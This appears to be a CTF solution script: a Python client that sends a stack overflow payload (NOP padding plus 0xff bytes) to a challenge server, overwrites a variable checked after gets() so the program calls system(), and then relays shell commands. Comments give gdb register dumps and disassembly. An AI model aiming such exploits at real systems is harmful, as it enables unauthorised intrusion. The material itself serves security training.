#!/bin/python3
import sys
import socket
import threading
from time import sleep

payload = b'\x90' * 40 + b'\xff' * 8 + b'\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('mc.ax', 31199))

def servermsg(msg):
  print(f"[server]: {msg}")
def clientmsg(msg):
  print(f"[client]: {msg}")

def thread_func():
  while 1:
    buf = s.recv(1024)
    if buf: servermsg(buf.decode("utf-8"))

threading.Thread(target=thread_func).start()

while 1:
  cmd = input("> ").strip()
  if cmd == "pwn":
    s.send(bytes(payload))
    clientmsg("pwn sent")
  elif cmd == "exit":
    clientmsg("bye")
    exit(0)
  elif cmd.startswith('!'):
    msg = cmd[1:]
    s.sendall((msg + "\n").encode('utf-8'))
    clientmsg(f"sent command `{msg}`")
  else:
    clientmsg("unknown command")


# a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3c4c5c6c7c8c9
# ----------------------------------------xxxxxxxx............
# 
# $rax   : 0x0
# $rbx   : 0x00000000004012c0  →  <__libc_csu_init+0> endbr64
# $rcx   : 0x00007ffff7f7d800  →  0x00000000fbad208b
# $rdx   : 0x0
# $rsp   : 0x00007fffffffd8d8  →  "c8c9d0d1d2d3d4d5d6d7d8d9e0e1e2e3e4e5e6e7e8e9"
# $rbp   : 0x3763366335633463 ("c4c5c6c7"?) <!-- deze kan overschreven worden -------------------------\
# $rsi   : 0x00007ffff7f7d883  →  0xf804e0000000000a                                                   |
# $rdi   : 0x00007ffff7f804e0  →  0x0000000000000000                                                   |
# $rip   : 0x00000000004012be  →  <main+200> ret                                                       |
# $r8    : 0x00007fffffffd8a0  →  "a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3c4[...]"            |
# $r9    : 0x0                                                                                         |
# $r10   : 0x00007ffff7dc4ff8  →  0x0010002200003ec3                                                   |
# $r11   : 0x246                                                                                       |
# $r12   : 0x0000000000401110  →  <_start+0> endbr64                                                   |
# $r13   : 0x0                                                                                         |
# $r14   : 0x0                                                                                         |
# $r15   : 0x0                                                                                         |
#                                                                                                      |
# disas main (gdb)                                                                                     |
# 0x0000000000401299 <+163>:   lea    rax,[rbp-0x30]                                                   |
# 0x000000000040129d <+167>:   mov    rdi,rax                                                          |
# 0x00000000004012a0 <+170>:   call   0x4010f0 <gets@plt>                                              |
# 0x00000000004012a5 <+175>:   cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff <!------------------------/
# 0x00000000004012aa <+180>:   jne    0x4012b8 <main+194>
# 0x00000000004012ac <+182>:   lea    rdi,[rip+0xf35]        # 0x4021e8
# 0x00000000004012b3 <+189>:   call   0x4010c0 <system@plt>
# 0x00000000004012b8 <+194>:   mov    eax,0x0
# 0x00000000004012bd <+199>:   leave
# 0x00000000004012be <+200>:   ret
